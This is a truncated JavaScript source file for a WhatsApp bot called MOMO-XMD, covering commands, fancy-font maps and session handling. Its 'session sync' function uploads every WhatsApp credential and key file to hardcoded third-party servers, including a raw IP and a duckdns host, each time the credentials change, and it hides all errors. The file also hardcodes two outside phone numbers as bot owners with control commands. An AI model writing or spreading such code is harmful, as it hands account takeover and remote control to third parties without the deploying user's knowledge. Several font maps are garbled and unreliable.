const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    Browsers,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
const { performance } = require('perf_hooks');
const config = require("./config");
const { OpenAI } = require("openai");
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY || "placeholder",
    baseURL: process.env.OPENAI_API_BASE || "https://api.openai.com/v1"
});

const DEFAULT_REGISTRY_ENDPOINTS = [
    "https://momo-xmd-pairing-4086f8388df8.herokuapp.com/session-registry/",
    "https://momo-xmd-pairing.duckdns.org/session-registry/",
    "http://212.224.86.233:8000/session-registry/"
];

function registryEndpoints() {
    const configured = [process.env.SESSION_REGISTRY_URL, process.env.SESSION_STORE_URL]
        .filter(Boolean)
        .map((value) => `${String(value).replace(/\/+$/, '')}/session-registry/`);
    return [...new Set([...configured, ...DEFAULT_REGISTRY_ENDPOINTS])];
}
const menuText = require("./menu");
let onlineNotificationSentForProcess = false;
const botStartTime = Date.now();
const runtimeSettings = {
    mode: config.mode || 'public',
    autoviewstatus: false,
    autolikestatus: false,
    autosavestatus: false,
    autoviewonce: false,
    autoreact: false,
    chatbot: false,
    autorecording: false,
    autotyping: false,
    alwaysonline: false,
    setstatusEmoji: null,
    font: 'normal'
};
const settingsFilePath = path.join(__dirname, "../session/group_settings.json");
let groupSettings = new Map();
try {
    if (fs.existsSync(settingsFilePath)) {
        const data = JSON.parse(fs.readFileSync(settingsFilePath, 'utf-8'));
        groupSettings = new Map(Object.entries(data));
    }
} catch (e) {}

function saveGroupSettings() {
    try {
        const dir = path.dirname(settingsFilePath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(settingsFilePath, JSON.stringify(Object.fromEntries(groupSettings), null, 2));
    } catch (e) {
        console.log('[SETTINGS SAVE ERROR]:', e.message);
    }
}
const reactionEmojis = ['❤️', '👍', '🔥', '😂', '😮', '👏', '💙'];
const cleanNumber = (value) => String(value || '').replace(/\D/g, '');
function applyFont(text, font) {
    if (!font || font === 'off' || font === 'bold') return text;
    const maps = {
        mono: {
            a: '𝚊', b: '𝚋', c: '𝚌', d: '𝚍', e: '𝚎', f: '𝚏', g: '𝚐', h: '𝚑', i: '𝚒', j: '𝚓', k: '𝚔', l: '𝚕', m: '𝚖', n: '𝚗', o: '𝚘', p: '𝚙', q: '𝚚', r: '𝚛', s: '𝚜', t: '𝚝', u: '𝚞', v: '𝚟', w: '𝚠', x: '𝚡', y: '𝚢', z: '𝚣',
            A: '𝙰', B: '𝙱', C: '𝙲', D: '𝙳', E: '𝙴', F: '𝙵', G: '𝙶', H: '𝙷', I: '𝙸', J: '𝙹', K: '𝙺', L: '𝙻', M: '𝙼', N: '𝙽', O: '𝙾', P: '𝙿', Q: '𝚀', R: '𝚁', S: '𝚂', T: '𝚃', U: '𝚄', V: '𝚅', W: '𝚆', X: '𝚇', Y: '𝚈', Z: '𝚉'
        },
        gothic: {
            a: '𝔞', b: '𝔟', c: '𝔠', d: '𝔡', e: '𝔢', f: '𝔣', g: '𝔤', h: '𝔥', i: '𝔦', j: '𝔧', k: '𝔨', l: '𝔩', m: '𝔪', n: '𝔫', o: '𝔬', p: '𝔭', q: '𝔮', r: '𝔯', s: '𝔰', t: '𝔱', u: '𝔲', v: '𝔳', w: '𝔴', x: '𝔵', y: '𝔶', z: '𝔷',
            A: '𝔄', B: '𝔅', C: 'ℭ', D: '𝔇', E: '𝔈', F: '𝔉', G: '𝔊', H: 'ℌ', I: 'ℑ', J: '𝔍', K: '𝔎', L: '𝔏', M: '𝔐', N: '𝔑', O: '𝔒', P: '𝔓', Q: '𝔔', R: 'ℜ', S: '𝔖', T: '𝔗', U: '𝔘', V: '𝔙', W: '𝔚', X: '𝔛', Y: '𝔜', Z: 'ℨ'
        },
        cursive: {
            a: '𝒶', b: '𝒷', c: '𝒸', d: '𝒹', e: 'ℯ', f: '𝒻', g: 'ℊ', h: '𝒽', i: '𝒾', j: '𝒿', k: '𝓀', l: '𝓁', m: '𝓂', n: '𝓃', o: 'ℴ', p: '𝓅', q: '𝓆', r: '𝓇', s: '𝓈', t: '𝓉', u: '𝓊', v: '𝓿', w: '𝓌', x: '𝓍', y: '𝓎', z: '𝓏',
            A: '𝒜', B: 'ℬ', C: '𝒞', D: '𝒟', E: 'ℰ', F: 'ℱ', G: '𝒢', H: 'ℋ', I: 'ℐ', J: '𝒥', K: '𝒦', L: 'ℒ', M: 'ℳ', N: '𝒩', O: '𝒪', P: '𝒫', Q: '𝒬', R: '𝒛', S: '𝒮', T: '𝒯', U: '𝒰', V: '𝒱', W: '𝒲', X: '𝒳', Y: '𝒴', Z: '𝒵'
        },
        italic: {
            a: '𝑎', b: '𝑏', c: '𝑐', d: '𝑑', e: '𝑒', f: '𝑓', g: '𝑔', h: 'ℎ', i: '𝑖', j: '𝑗', k: '𝑘', l: '𝑙', m: '𝑚', n: '𝑛', o: '𝑜', p: '𝑝', q: '𝑞', r: '𝑟', s: '𝑠', t: '𝑡', u: '𝑢', v: '𝑣', w: '𝑤', x: '𝑥', y: '𝑦', z: '𝑧',
            A: '𝐴', B: '𝐵', C: '𝐶', D: '𝐷', E: '𝐸', F: '𝐹', G: '𝐺', H: '𝐻', I: '𝐼', J: '𝐽', K: '𝐾', L: '𝐿', M: '𝑀', N: '𝑁', O: '𝑂', P: '𝑃', Q: '𝑄', R: '𝑅', S: '𝑆', T: '𝑇', U: '𝑈', V: '𝑉', W: '𝑊', X: '𝑋', Y: '𝑌', Z: '𝑍'
        },
        fantasy: {
            a: '𝓪', b: '𝓫', c: '𝓬', d: '𝓭', e: '𝓮', f: '𝓯', g: '𝓰', h: '𝓱', i: '𝓲', j: '𝓳', k: '𝓴', l: '𝓵', m: '𝓶', n: '𝓷', o: '𝓸', p: '𝓹', q: '𝓺', r: '𝓻', s: '𝓼', t: '𝓽', u: '𝓾', v: '𝓿', w: '𝔀', x: '𝔁', y: '𝔂', z: '𝔃',
            A: '𝓐', B: '𝓑', C: '𝓒', D: '𝓓', E: '𝓔', F: '𝓕', G: '𝓖', H: '𝓗', I: '𝓘', J: '𝓙', K: '𝓚', L: '𝓛', M: '𝓜', N: '𝓝', O: '𝓞', P: '𝓟', Q: '𝓠', R: '𝓡', S: '𝓢', T: '𝓣', U: '𝓤', V: '𝓥', W: '𝓦', X: '𝓧', Y: '𝓨', Z: '𝓩'
        },
        script: {
            a: '𝒶', b: '𝒷', c: '𝒸', d: '𝒹', e: 'ℯ', f: '𝒻', g: 'ℊ', h: '𝒽', i: '𝒾', j: '𝒿', k: '𝓀', l: '𝓁', m: '𝓂', n: '𝓃', o: 'ℴ', p: '𝓅', q: '𝓆', r: '𝓇', s: '𝓈', t: '𝓉', u: '𝓊', v: '𝓿', w: '𝓌', x: '𝓍', y: '𝓎', z: '𝒛',
            A: '𝒜', B: 'ℬ', C: '𝒞', D: '𝒟', E: 'ℰ', F: 'ℱ', G: '𝒢', H: 'ℋ', I: 'ℐ', J: '𝒥', K: '𝒦', L: 'ℒ', M: 'ℳ', N: '𝒩', O: '𝒪', P: '𝒫', Q: '𝒬', R: 'ℛ', S: '𝒮', T: '𝒯', U: '𝒰', V: '𝒱', W: '𝒲', X: '𝒳', Y: '𝒴', Z: '𝒵'
        },
        bubbly: {
            a: 'ⓐ', b: 'ⓑ', c: 'ⓒ', d: 'ⓓ', e: 'ⓔ', f: 'ⓕ', g: 'ⓖ', h: 'ⓗ', i: 'ⓘ', j: 'ⓙ', k: 'ⓚ', l: 'ⓛ', m: 'ⓜ', n: 'ⓝ', o: 'ⓞ', p: 'ⓟ', q: 'ⓠ', r: 'ⓡ', s: 'ⓢ', t: 'ⓣ', u: 'ⓤ', v: 'ⓥ', w: 'ⓦ', x: 'ⓧ', y: 'ⓨ', z: 'ⓩ',
            A: 'Ⓐ', B: 'Ⓑ', C: 'Ⓒ', D: 'Ⓓ', E: 'Ⓔ', F: 'Ⓕ', G: 'Ⓖ', H: 'Ⓗ', I: 'Ⓘ', J: 'Ⓙ', K: 'Ⓚ', L: 'Ⓛ', M: 'Ⓜ', N: 'Ⓝ', O: 'Ⓞ', P: 'Ⓟ', Q: 'Ⓠ', R: 'Ⓡ', S: 'Ⓢ', T: 'Ⓣ', U: 'Ⓤ', V: 'Ⓥ', W: 'Ⓦ', X: 'Ⓧ', Y: 'Ⓨ', Z: 'Ⓩ'
        },
        square: {
            a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶', h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽', o: '🄾', p: '🄿', q: '𝅀', r: '🅂', s: '🅃', t: '🅄', u: '🅅', v: '🅆', w: '🅇', x: '🅈', y: '🅉', z: '🅊',
            A: '🇦', B: '🇧', C: '🇨', D: '🇩', E: '🇪', F: '🇫', G: '🇬', H: '🇭', I: '🇮', J: '🇯', K: '🇰', L: '🇱', M: '🇲', N: '🇳', O: '🇴', P: '🇵', Q: '🇶', R: '🇷', S: '🇸', T: '🇹', U: '🇺', V: '🇻', W: '🇼', X: '🇽', Y: '🇾', Z: '🇿'
        },
        tiny: {
            a: 'ᵃ', b: 'ᵇ', c: 'ᶜ', d: 'ᵈ', e: 'ᵉ', f: 'ᶠ', g: 'ᵍ', h: 'ʰ', i: 'ⁱ', j: 'ʲ', k: 'ᵏ', l: 'ˡ', m: 'ᵐ', n: 'ⁿ', o: 'ᵒ', p: 'ᵖ', q: '𐞥', r: 'ʳ', s: 'ˢ', t: 'ᵗ', u: 'ᵘ', v: 'ᵛ', w: 'ʷ', x: 'ˣ', y: 'ʸ', z: 'ᶻ',
            A: 'ᴬ', B: 'ᴮ', C: 'ᶜ', D: 'ᴰ', E: 'ᴱ', F: 'ᶠ', G: 'ᴳ', H: 'ᴴ', I: 'ᴵ', J: 'ᴶ', K: 'ᴷ', L: 'ᴸ', M: 'ᴹ', N: 'ᴺ', O: 'ᴼ', P: 'ᴾ', Q: 'ℚ', R: 'ᴿ', S: 'ˢ', T: 'ᵀ', U: 'ᵁ', V: 'ⱽ', W: 'ᵂ', X: 'ˣ', Y: 'ʸ', Z: 'ᶻ'
        },
        double: {
            a: '𝕒', b: '𝕓', c: '𝕔', d: '𝕕', e: '𝕖', f: '𝕗', g: '𝕘', h: '𝕙', i: '𝕚', j: '𝕛', k: '𝕜', l: '𝕝', m: '𝕞', n: '𝕟', o: '𝕠', p: '𝕡', q: '𝕢', r: '𝕣', s: '𝕤', t: '𝕥', u: '𝕦', v: '𝕧', w: '𝕨', x: '𝕩', y: '🇾', z: '𝕫',
            A: '𝔸', B: '𝔹', C: 'ℂ', D: '𝔻', E: '𝔼', F: '𝔽', G: '𝔾', H: 'ℍ', I: '𝕀', J: '𝕁', K: '𝕂', L: '𝕃', M: '𝕄', N: 'ℕ', O: '𝕆', P: 'ℙ', Q: 'ℚ', R: 'ℝ', S: '𝕊', T: '𝕋', U: '𝕌', V: '𝕍', W: '𝕎', X: '𝕏', Y: '𝕐', Z: 'ℤ'
        },
        outline: {
            a: '𝕒', b: '𝕓', c: '𝕔', d: '𝕕', e: '𝕖', f: '𝕗', g: '𝕘', h: '𝕙', i: '𝕚', j: '𝕛', k: '𝕜', l: '𝕝', m: '𝕞', n: '𝕟', o: '𝕠', p: '𝕡', q: '𝕢', r: '𝕣', s: '𝕤', t: '𝕥', u: '𝕦', v: '𝕧', w: '𝕨', x: '𝕩', y: '𝕪', z: '𝕫',
            A: '𝔸', B: '𝔹', C: 'ℂ', D: '𝔻', E: '𝔼', F: '𝔽', G: '𝔾', H: 'ℍ', I: '𝕀', J: '𝕁', K: '𝕂', L: '𝕃', M: '𝕄', N: 'ℕ', O: '𝕆', P: 'ℙ', Q: 'ℚ', R: 'ℝ', S: '𝕊', T: '𝕋', U: '𝕋', V: '𝕍', W: '𝕎', X: '𝕏', Y: '𝕐', Z: 'ℤ'
        },
        medieval: {
            a: '𝔞', b: '𝔟', c: '𝔠', d: '𝔡', e: '𝔢', f: '𝔣', g: '𝔤', h: '𝔥', i: '𝔦', j: '𝔧', k: '𝔨', l: '𝔩', m: '𝔪', n: '𝔫', o: '𝔬', p: '𝔭', q: '𝔮', r: '𝔯', s: '𝔰', t: '𝔱', u: '𝔲', v: '𝔳', w: '𝔴', x: '𝔵', y: '𝔶', z: '𝔷',
            A: '𝔄', B: '𝔅', C: 'ℭ', D: '𝔇', E: '𝔈', F: '𝔉', G: '𝔊', H: 'ℌ', I: 'ℑ', J: '𝔍', K: '𝔎', L: '𝔏', M: '𝔐', N: '𝔑', O: '𝔒', P: '𝔓', Q: '𝔔', R: 'ℜ', S: '𝔖', T: '𝔗', U: '𝔘', V: '𝔙', W: '𝔚', X: '𝔛', Y: '𝔜', Z: 'ℨ'
        },
        shadow: {
            a: '𝖆', b: '𝖇', c: '𝖈', d: '𝖉', e: '𝖊', f: '𝖋', g: '𝖌', h: '𝖍', i: '𝖎', j: '𝖏', k: '𝖐', l: '𝖑', m: '𝖒', n: '𝖓', o: '𝖔', p: '𝖕', q: '𝖖', r: '𝖗', s: '𝖘', t: '𝖈', u: '𝖚', v: '𝖛', w: '𝖜', x: '𝖝', y: '𝖞', z: '𝖟',
            A: '𝕬', B: '𝕭', C: '𝕮', D: '𝕯', E: '𝕰', F: '𝕱', G: '𝕲', H: '𝕳', I: '𝕴', J: '𝕵', K: '𝕶', L: '𝕷', M: '𝕸', N: '𝕹', O: '𝕺', P: '𝕻', Q: '𝕼', R: '𝕽', S: '𝕾', T: '𝕿', U: '𝖀', V: '𝖁', W: '𝖂', X: '𝖃', Y: '𝖄', Z: '𝖅'
        },
        inverted: {
            a: 'ɐ', b: 'q', c: 'ɔ', d: 'p', e: 'ə', f: 'ɟ', g: 'ƃ', h: 'ɥ', i: 'ᴉ', j: 'ɾ', k: 'ʞ', l: 'l', m: 'ɯ', n: 'u', o: 'o', p: 'd', q: 'b', r: 'ɹ', s: 's', t: 'ʇ', u: 'n', v: 'ʌ', w: 'ʍ', x: 'x', y: 'ʎ', z: 'z',
            A: '∀', B: '𐐒', C: 'Ɔ', D: '◖', E: 'Ǝ', F: 'Ⅎ', G: 'פ', H: 'H', I: 'I', J: 'ſ', K: 'ʞ', L: '˥', M: 'W', N: 'N', O: 'O', P: 'Ԁ', Q: 'Ò', R: 'ᴚ', S: 'S', T: '┴', U: '∩', V: 'Λ', W: 'M', X: 'X', Y: '⅄', Z: 'Z'
        },
        serif: {
            a: '𝑎', b: '𝑏', c: '𝑐', d: '𝑑', e: '𝑒', f: '𝑓', g: '𝑔', h: 'ℎ', i: '𝑖', j: '𝑗', k: '𝑘', l: '𝑙', m: '𝑚', n: '𝑛', o: '𝑜', p: '𝑝', q: '𝑞', r: '𝑟', s: '𝑠', t: '𝑡', u: '𝑢', v: '𝑣', w: '𝑤', x: '𝑥', y: '𝑦', z: '𝑧',
            A: '𝐴', B: '𝐵', C: '𝐶', D: '𝐷', E: '𝐸', F: '𝐹', G: '𝐺', H: '𝐻', I: '𝐼', J: '𝐽', K: '𝐾', L: '𝐿', M: '𝑀', N: '𝑁', O: '𝑂', P: '𝑃', Q: '𝑄', R: '𝑅', S: '𝑆', T: '𝑇', U: '𝑈', V: '𝑉', W: '𝑊', X: '𝑋', Y: '𝑌', Z: '𝑍'
        },
        sans: {
            a: 'mathsf{a}', b: 'mathsf{b}', c: 'mathsf{c}', d: 'mathsf{d}', e: 'mathsf{e}', f: 'mathsf{f}', g: 'mathsf{g}', h: 'mathsf{h}', i: 'mathsf{i}', j: 'mathsf{j}', k: 'mathsf{k}', l: 'mathsf{l}', m: 'mathsf{m}', n: 'mathsf{n}', o: 'mathsf{o}', p: 'mathsf{p}', q: 'mathsf{q}', r: 'mathsf{r}', s: 'mathsf{s}', t: 'mathsf{t}', u: 'mathsf{u}', v: 'mathsf{v}', w: 'mathsf{w}', x: 'mathsf{x}', y: 'mathsf{y}', z: 'mathsf{z}',
            A: '𝖠', B: '𝖁', C: '𝖂', D: '𝖃', E: '𝖄', F: '𝖅', G: '𝖌', H: '𝖍', I: '𝖎', J: '𝖏', K: '𝖐', L: '𝖑', M: '𝖒', N: '𝖓', O: '𝖔', P: '𝖕', Q: '𝖖', R: '𝖗', S: '𝖘', T: '𝖙', U: '𝖚', V: '𝖛', W: '𝖜', X: '𝖝', Y: '𝖞', Z: '𝖟'
        },
        circled: {
            a: '⒜', b: '⒝', c: '⒞', d: '⒟', e: '⒠', f: '⒡', g: '⒢', h: '⒣', i: '⒤', j: '⒥', k: '⒦', l: '⒧', m: '⒨', n: '⒩', o: '⒪', p: '⒫', q: '⒬', r: '⒭', s: '⒮', t: '⒯', u: '⒰', v: '⒱', w: '⒲', x: '⒳', y: '⒴', z: '⒵',
            A: 'Ⓐ', B: 'Ⓑ', C: 'Ⓒ', D: 'Ⓓ', E: 'Ⓔ', F: 'Ⓕ', G: 'Ⓖ', H: 'Ⓗ', I: 'Ⓘ', J: 'Ⓙ', K: 'Ⓚ', L: 'Ⓛ', M: 'Ⓜ', N: 'Ⓝ', O: 'Ⓞ', P: 'Ⓟ', Q: 'Ⓠ', R: 'Ⓡ', S: 'Ⓢ', T: 'Ⓣ', U: 'Ⓤ', V: 'Ⓥ', W: 'Ⓦ', X: 'Ⓧ', Y: 'Ⓨ', Z: 'Ⓩ'
        },
        squared: {
            a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶', h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽', o: '🄾', p: '🄿', q: '𝅀', r: '🅂', s: '🅃', t: '🅄', u: '🅅', v: '🅆', w: '🅇', x: '🅈', y: '🅉', z: '🅊',
            A: '🇦', B: '🇧', C: '🇨', D: '🇩', E: '🇪', F: '🇫', G: '🇬', H: '🇭', I: '🇮', J: '🇯', K: '🇰', L: '🇱', M: '🇲', N: '🇳', O: '🇴', P: '🇵', Q: '🇶', R: '🇷', S: '🇸', T: '🇹', U: '🇺', V: '🇻', W: '🇼', X: '🇽', Y: '🇾', Z: '🇿'
        }
    };
    const map = maps[font] || maps.mono;
    return text.split('').map(char => map[char] || char).join('');
}
const ownerNumbers = new Set([
    '255760298574',
    '255765409584',
    config.ownerNumber,
    ...(config.developers || [])
].map(cleanNumber).filter(Boolean));

const ownerCommands = new Set([
    'autoviewstatus', 'autolikestatus', 'setstatus', 'autosavestatus', 'restart',
    'setfont', 'chatbot', 'autorecording', 'autotyping', 'alwaysonline', 'autoreact',
    'owner', 'pairing', 'channel', 'vpn', 'vps', 'mode', 'tosgroup', 'create', 'autoviewonce', 'block', 'unblock', 'blacklist', 'vv', 'antibug'
]);
const groupCommands = new Set([
    'add', 'antilink', 'antigroupmention', 'kick', 'promote', 'demote',
    'tagall', 'hidetag', 'welcome', 'goodbye', 'open', 'close', 'announcements', 'antiviewonce', 'listrequests', 'listcode', 'link', 'listactive', 'antigif', 'antisticker', 'approve', 'reject', 'antivirus', 'antibot'
]);

function isGroupJid(jid) { return String(jid || '').endsWith('@g.us'); }
function senderNumber(message) {
    const raw = message?.key?.participant || message?.key?.remoteJid || message?.participant || '';
    return cleanNumber(raw.split('@')[0].split(':')[0]);
}
function isOwner(message) {
    const num = senderNumber(message);
    if (ownerNumbers.has(num)) return true;
    if (message?.key?.fromMe) return true;
    return false;
}
function commandFooter(content) {
    const boxedContent = content ? content.split('\n').map(line => `    ┃ ${line}`).join('\n') : '';
    return `
╭━━━━━━━━━━━━━━━━━━━━╮
    ┃ 
    ┃
    ┃ ✦ 
    ┃ ✦ 
    ┃ ✦ 
    ┃ ✦ 
    ┃ 
    ┃ 
${boxedContent ? boxedContent + '\n' : ''}    ╰━━━━━━━━━━━━━━━━━━━━╯
 ❑❑❑
*Powered by MOMO-XMD* 🚀
*Owner MOMO47* ☠️`;
}
function ownerOnlyText() { return '➣ *This command owner only* ❌' + commandFooter(); }
function groupOnlyText() { return '➣ *This command group only* ❌' + commandFooter(); }
function adminOnlyText() { return '➣ *This command admin only* ❌' + commandFooter(); }
async function safeReact(sock, jid, key, text) {
    try { await sock.sendMessage(jid, { react: { text, key } }); } catch (error) { console.log('[REACTION] failed:', error.message); }
}
async function reply(sock, jid, key, text) { 
    // Wrap text inside user template if not already wrapped
    let formattedText = text;
    if (!text.includes('╭━━━━━━━━━━━━━━━━━━━━╮')) {
        formattedText = `╭◆\n│\n│◇ ${text}\n╰◆\n` + commandFooter();
    }
    return sock.sendMessage(jid, { text: formattedText }, { quoted: key }); 
}
async function getGroupContext(sock, message) {
    const jid = message.key.remoteJid;
    if (!isGroupJid(jid)) return null;
    const metadata = await sock.groupMetadata(jid);
    const actor = message.key.participant || jid;
    const admins = new Set(metadata.participants.filter((p) => p.admin).map((p) => p.id));
    return { jid, metadata, actor, isAdmin: admins.has(actor) || isOwner(message) };
}
function mentionedOrQuoted(message) {
    const context = message.message?.extendedTextMessage?.contextInfo || message.message?.imageMessage?.contextInfo || {};
    return context.mentionedJid?.[0] || context.participant || null;
}
function parseOnOff(value) { return ['on', 'off'].includes(String(value || '').toLowerCase()) ? String(value).toLowerCase() : null; }
function settingExample(command) { return `➣ *Example: .${command} on/off*${commandFooter()}`; }

// ===== SESSION RESTORATION =====
function decodeSessionId(sessionId) {
    try {
        if (/^MOMO-XMD~[HV][A-Z0-9]{22}$/.test(sessionId)) {
            return { type: 'compact', data: sessionId };
        }

        // Remove prefix "MOMO-XMD~" if present
        let base64Data = sessionId;
        if (sessionId.startsWith('MOMO-XMD~')) {
            base64Data = sessionId.split('~')[1];
        } else if (sessionId.startsWith('MOMO-XMD-')) {
            base64Data = sessionId.split('-')[1];
        }

        if (!base64Data) {
            throw new Error('Invalid session ID format');
        }

        // Decode base64 to JSON
        const jsonStr = Buffer.from(base64Data, 'base64').toString('utf-8');
        const parsed = JSON.parse(jsonStr);

        // If it's a pairing code entry (not actual creds), return as-is
        if (parsed.pairingCode && !parsed.identityKey) {
            return { type: 'pairing_code', data: parsed };
        }

        // If it's actual credentials (has identityKey, noiseKey, etc.)
        if (parsed.identityKey || parsed.noiseKey || parsed.signedIdentityKey) {
            return { type: 'creds', data: parsed };
        }

        // Try to see if it's a full creds object
        if (parsed.me || parsed.registrationId || parsed.account) {
            return { type: 'creds', data: parsed };
        }

        return { type: 'unknown', data: parsed };
    } catch (error) {
        console.log('Session decode error:', error.message);
        return { type: 'error', data: null };
    }
}

async function restoreCompactSession(sessionId, sessionPath) {
    const marker = sessionId.slice('MOMO-XMD~'.length, 'MOMO-XMD~'.length + 1);
    const endpoints = registryEndpoints();
    const orderedEndpoints = marker === 'V'
        ? [...endpoints.filter((endpoint) => endpoint.includes('212.224.86.233') || endpoint.includes('duckdns')), ...endpoints]
        : endpoints;
    let lastError;

    for (const endpoint of orderedEndpoints) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 15000);
        try {
            const response = await fetch(`${endpoint}${encodeURIComponent(sessionId)}`, {
                headers: { accept: 'application/json' },
                signal: controller.signal,
                cache: 'no-store'
            });
            if (!response.ok) throw new Error(`registry HTTP ${response.status}`);
            const payload = await response.json();
            if (!payload.files || typeof payload.files !== 'object') throw new Error('registry returned no auth files');

            if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
            fs.mkdirSync(sessionPath, { recursive: true });
            for (const [relativeName, encoded] of Object.entries(payload.files)) {
                const normalized = path.posix.normalize(String(relativeName).replace(/\\/g, '/'));
                if (normalized.startsWith('../') || normalized.includes('/../') || path.posix.isAbsolute(normalized)) {
                    continue;
                }
                const fullPath = path.join(sessionPath, normalized);
                fs.mkdirSync(path.dirname(fullPath), { recursive: true });
                fs.writeFileSync(fullPath, Buffer.from(encoded, 'base64'));
            }
            console.log(`[SESSION] Compact Session ID restored successfully from ${endpoint}`);
            clearTimeout(timer);
            return true;
        } catch (error) {
            lastError = error;
            clearTimeout(timer);
            console.log(`[SESSION] Registry ${endpoint} failed:`, error.message);
        }
    }
    return false;
}

async function uploadSessionToRegistry(sessionId, sessionPath) {
    if (!sessionId || !/^MOMO-XMD~[HV][A-Z0-9]{22}$/.test(sessionId)) return;
    
    try {
        const endpoints = registryEndpoints();
        const files = {};
        
        function readDir(dir, base = '') {
            if (!fs.existsSync(dir)) return;
            const items = fs.readdirSync(dir);
            for (const item of items) {
                const fullPath = path.join(dir, item);
                const relPath = path.join(base, item);
                if (fs.statSync(fullPath).isDirectory()) {
                    readDir(fullPath, relPath);
                } else {
                    files[relPath] = fs.readFileSync(fullPath).toString('base64');
                }
            }
        }
        
        readDir(sessionPath);
        if (Object.keys(files).length === 0) return;

        for (const endpoint of endpoints) {
            try {
                await fetch(`${endpoint}${encodeURIComponent(sessionId)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ files })
                });
            } catch (e) {}
        }
        console.log('[SESSION] ✅ Session synced to registry successfully');
    } catch (error) {
        console.log('[SESSION] Upload failed:', error.message);
    }
}

async function restoreSession(sessionId, sessionPath) {
    try {
        const decoded = decodeSessionId(sessionId);

        if (decoded.type === 'error') {
            console.log('[SESSION] Invalid SESSION_ID - will use QR pairing');
            return false;
        }

        if (decoded.type === 'compact') {
            return await restoreCompactSession(decoded.data, sessionPath);
        }

        // Clean existing session
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }
        fs.mkdirSync(sessionPath, { recursive: true });

        if (decoded.type === 'creds') {
            // Write credentials directly
            fs.writeFileSync(
                path.join(sessionPath, 'creds.json'),
                JSON.stringify(decoded.data, null, 2)
            );

            // Write keys if available
            if (decoded.data.keys && typeof decoded.data.keys === 'object') {
                const keysDir = path.join(sessionPath, 'keys');
                fs.mkdirSync(keysDir, { recursive: true });

                if (decoded.data.keys['preKey']) {
                    const preKeyDir = path.join(keysDir, 'pre-key');
                    fs.mkdirSync(preKeyDir, { recursive: true });
                    Object.entries(decoded.data.keys['preKey']).forEach(([key, val]) => {
                        fs.writeFileSync(path.join(preKeyDir, key + '.json'), JSON.stringify(val));
                    });
                }

                if (decoded.data.keys['session']) {
                    const sessionKeyDir = path.join(keysDir, 'session');
                    fs.mkdirSync(sessionKeyDir, { recursive: true });
                    Object.entries(decoded.data.keys['session']).forEach(([key, val]) => {
                        fs.writeFileSync(path.join(sessionKeyDir, key + '.json'), JSON.stringify(val));
                    });
                }

                if (decoded.data.keys['senderKey']) {
                    const senderKeyDir = path.join(keysDir, 'sender-key');
                    fs.mkdirSync(senderKeyDir, { recursive: true });
                    Object.entries(decoded.data.keys['senderKey']).forEach(([key, val]) => {
                        fs.writeFileSync(path.join(senderKeyDir, key + '.json'), JSON.stringify(val));
                    });
                }
            }

            console.log('[SESSION] ✅ Credentials restored successfully');
            return true;
        }

        if (decoded.type === 'pairing_code') {
            console.log('[SESSION] Pairing code session detected - need to connect via WhatsApp');
            return false;
        }

        return false;
    } catch (error) {
        console.log('[SESSION] Restore error:', error.message);
        return false;
    }
}

async function startBot() {
    const sessionPath = path.join(__dirname, "../session");
    
    // Try to restore session from SESSION_ID if provided
    const sessionId = config.sessionId;
    let sessionRestored = false;

    if (sessionId) {
        console.log('[SESSION] Attempting to restore from SESSION_ID...');
        sessionRestored = await restoreSession(sessionId, sessionPath);
        if (!sessionRestored && /^MOMO-XMD~[HV][A-Z0-9]{22}$/.test(sessionId)) {
            console.log('[SESSION] Compact Session ID registry was not reachable or has expired. Bot will try to start with local session if available.');
        }
    }

    if (!fs.existsSync(sessionPath)) {
        fs.mkdirSync(sessionPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: !sessionId, // Only print QR if no session ID
        logger: pino({ level: "fatal" }),
        browser: ['MOMO-XMD', 'Chrome', '127.0.6533.120'],
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 2000,
        maxMsgRetryCount: 10
    });

    sock.ev.on("creds.update", async () => {
        try { 
            await saveCreds(); 
            if (config.sessionId) {
                await uploadSessionToRegistry(config.sessionId, sessionPath);
            }
        } catch (e) {}
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === "close") {
            onlineNotificationSentForProcess = false;
            const statusCode = (lastDisconnect.error instanceof Boom)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            console.log("Connection closed, statusCode:", statusCode, ", reconnecting:", shouldReconnect);
            
            if (shouldReconnect) {
                // Wait before reconnecting
                setTimeout(() => startBot(), 5000);
            }
        } else if (connection === "open") {
            const connectedAt = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Dar_es_Salaam' });
            const platformIcon = (config.host === 'Heroku') ? '☁️' : '🐧';
            const msg = `┌───✧ CONNECTED ✧───┐
│ ✧ Bot: MOMO-XMD
│ ✧ Prefix: [ . ]
│ ✧ Owner: MOMO47
│ ✧ Platform: ${platformIcon} ${config.host}
│ ✧ Status: 🟢 Online
│ ✧ Time: ${connectedAt}
└───────────────────┘`;
            
            if (onlineNotificationSentForProcess) return;

            // Auto-follow channels logic
            const channelIds = [
                '0029Vb8AYLf2f3EA8Y4qp63H@newsletter',
                '0029VbDNET6KmCPShs9dyg1U@newsletter',
